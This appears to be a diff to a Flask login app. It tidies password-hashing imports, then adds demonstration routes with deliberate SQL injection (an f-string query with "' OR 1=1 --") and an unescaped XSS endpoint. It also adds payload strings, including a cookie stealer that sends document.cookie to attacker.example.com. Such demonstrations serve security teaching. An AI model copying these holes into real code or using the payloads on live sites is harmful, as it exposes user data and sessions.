@@ -1,6 +1,6 @@
 import sqlite3
 from flask import Flask, render_template, request, redirect, url_for, flash, session
-from werkzeug.security import generate_password_hash, check_password_hash
+from werkzeug import security
 import os
 import re
 from config import PASSWORD_CONFIG, PASSWORD_ERROR_MESSAGES
@@ -101,7 +101,7 @@ def login():
         user = conn.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
         conn.close()
         
-        if user and check_password_hash(user['password'], password):
+        if user and security.check_password_hash(user['password'], password):
             # Store user ID in session
             session.clear()
             session['user_id'] = user['id']
@@ -142,7 +142,7 @@ def register():
             return render_template('register.html')
         
         # Hash the password for security
-        hashed_password = generate_password_hash(password)
+        hashed_password = security.generate_password_hash(password)
         
         # Insert new user into database
         conn.execute('INSERT INTO users (username, email, password) VALUES (?, ?, ?)',
@@ -209,9 +209,72 @@ def sql_injection_attack():
     else:
         print("SQL Injection failed.")
 
+@app.route('/sql_injection_demo')
+def sql_injection_route():
+    """Route to demonstrate SQL injection"""
+    results = []
+    conn = sqlite3.connect('database.db')
+    cursor = conn.cursor()
+    
+    # The injected payload in the password field
+    username = ""
+    password = "' OR 1=1 --"
+    
+    # Vulnerable query
+    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
+    cursor.execute(query)
+    users = cursor.fetchall()
+    conn.close()
+    
+    # Format users for display
+    for user in users:
+        results.append(dict(zip([column[0] for column in cursor.description], user)))
+    
+    return render_template('sql_injection_demo.html', query=query, results=results)
+
+def generate_xss_payload():
+    """Generate a simple XSS payload for demonstration"""
+    # Basic XSS payload that displays an alert
+    basic_alert = "<script>alert('XSS Attack Successful!');</script>"
+    
+    # More complex payload that steals cookies
+    cookie_stealer = "<script>fetch('https://attacker.example.com/steal?cookie='+document.cookie);</script>"
+    
+    # DOM manipulation payload
+    dom_manipulator = "<script>document.body.style.backgroundColor='red'; document.body.innerHTML='<h1>Site Hacked!</h1>';</script>"
+    
+    return {
+        "basic_alert": basic_alert,
+        "cookie_stealer": cookie_stealer,
+        "dom_manipulator": dom_manipulator
+    }
+
+@app.route('/xss_demo')
+def xss_demo():
+    """Route to demonstrate XSS vulnerabilities"""
+    # Get name from query parameter (vulnerable to XSS)
+    name = request.args.get('name', '')
+    
+    # Generate sample payloads
+    payloads = generate_xss_payload()
+    
+    # Create examples of vulnerable code patterns
+    vulnerable_code = {
+        "direct_output": "app.route('/vulnerable')\ndef vulnerable():\n    name = request.args.get('name')\n    return f'<h1>Hello, {name}!</h1>'",
+        "innerHTML": "document.getElementById('username').innerHTML = userName; // userName is user-controlled",
+        "eval_usage": "eval('console.log(\"Welcome, ' + userName + '!\")'); // userName is user-controlled"
+    }
+    print(payloads)
+    # Return a template that will render the name parameter without escaping
+    return render_template('xss_demo.html', 
+                          name=name, 
+                          payloads=payloads, 
+                          vulnerable_code=vulnerable_code,
+                          example_url=request.host_url + "xss_demo?name=" + payloads["basic_alert"])
+
 if __name__ == '__main__':
     # Initialize the database
     init_db()
+    
     # Run the application on port 5000
-    app.run(debug=True, port=5000) 
-    sql_injection_dump_users()
+    app.run(debug=True, port=5000)
